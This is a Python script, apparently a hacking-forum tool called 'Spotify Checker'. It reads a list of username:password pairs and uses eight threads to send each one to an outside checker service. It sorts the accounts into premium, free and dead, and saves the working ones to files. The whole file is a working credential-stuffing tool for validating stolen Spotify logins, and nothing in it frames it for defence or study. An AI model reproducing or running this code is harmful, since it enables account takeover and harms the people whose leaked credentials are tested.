# !/usr/bin/python


import requests
import requests as reqs
from threading import *
from itertools import islice
import sys, os
print("""
   _____             _   _  __          _____ _               _             
  / ____|           | | (_)/ _|        / ____| |             | |            
 | (___  _ __   ___ | |_ _| |_ _   _  | |    | |__   ___  ___| | _____ _ __ 
  \___ \| '_ \ / _ \| __| |  _| | | | | |    | '_ \ / _ \/ __| |/ / _ \ '__|
  ____) | |_) | (_) | |_| | | | |_| | | |____| | | |  __/ (__|   <  __/ |   
 |_____/| .__/ \___/ \__|_|_|  \__, |  \_____|_| |_|\___|\___|_|\_\___|_|   
        | |                     __/ |                                       
        |_|                    |___/                                        
                                             www.xpykerz.com                
                                             help : t.me/Xpykerz_Chat
""")

check = input("\nWARNING....!..: The tools is on developing and this is BETA Version. Tool maybe miss behave sometimes. \n Do you want to continue (yes/no | Default:yes): ")

if check in ['n', 'N', 'No', 'no', 'NO']:
    sys.exit()

account = input("\nEnter the path to accounts file : ")
if not os.path.exists(account):
    sys.exit(f"[!] File '{account}' is does't exists!.")
elif os.path.getsize(account) == 0:
    sys.exit(f"[!] File '{account}' is empty!.")

premiumac = open("PremiumAccounts.txt", 'w')
freeac = open("FreeAccounts.txt", 'w')

Pno = 0
Fno = 0
Dno = 0
tryno = 0

url = "https://checkz.net/tools/ajax.php"

loaded = len(open(account).readlines())
print ("\n", loaded, " Accounts loaded for checking.......!")

print ("\nStatus	|	Country	|	Expire Date	|	Username:Password\n")


def result(country, userpass, response):
    global Pno, Fno, Dno, tryno
    if 'Premium' in (response.text):
        Pac = "|Premium account| Country:" + country + " | " + userpass
        premiumac.write(Pac)
        # print response.text
        tryno = tryno + 1
        Pno = Pno + 1
        print ("|", tryno, " Accounts Checked ..! | Premium:", Pno, " | Free: ", Fno, " | Dead: ", Dno)
        print (Pac)
    elif 'Free' in (response.text):
        Fac = "|Free account | Country:" + country + " Exp: Null| " + userpass
        freeac.write(Fac)
        tryno = tryno + 1
        Fno = Fno + 1
        print ("|", tryno, " Accounts Checked ..! | Premium:", Pno, " | Free: ", Fno, " | Dead: ", Dno)
        print (Fac)
    else:
        tryno = tryno + 1
        Dno = Dno + 1
        print ("|", tryno, " Accounts Checked ..! | Premium:", Pno, " | Free: ", Fno, " | Dead: ", Dno)
        print ("Dead account | Country: Null | Exp: Null | " + userpass)


def checker(userpass):
    form = {
        'checker': 'spotify',
        'mplist': str(userpass),
        'proxylist': '127.0.0.1:80'
    }

    response = reqs.post(url, form, stream=True)
    # print response.text
    country = ((response.text).split("Cntry:", 1)[-1]).split("<\/td><td>", 1)[0]
    result(country, userpass, response)


class checker1(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 0, loaded, 8):
                checker(lines)


class checker2(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 1, loaded, 8):
                checker(lines)


class checker3(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 2, loaded, 8):
                checker(lines)


class checker4(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 3, loaded, 8):
                checker(lines)


class checker5(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 4, loaded, 8):
                checker(lines)


class checker6(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 5, loaded, 8):
                checker(lines)


class checker7(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 6, loaded, 8):
                checker(lines)


class checker8(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 7, loaded, 8):
                checker(lines)


# plz Do not increase the number of checker it may cause server down

workers = [checker1(), checker2(), checker3(), checker4(), checker5(), checker6(), checker7(), checker8()]
for worker in workers:
    worker.start()
for worker in workers:
    worker.join()

print ("\nTotal Checked account = ", tryno)
print ("\nPremium Accounts List Saved at : PremiumAccounts.txt \nFree Accounts List Saved at : FreeAccounts.txt")
print ("\nSend your feed/report issue to @Xpykerz")
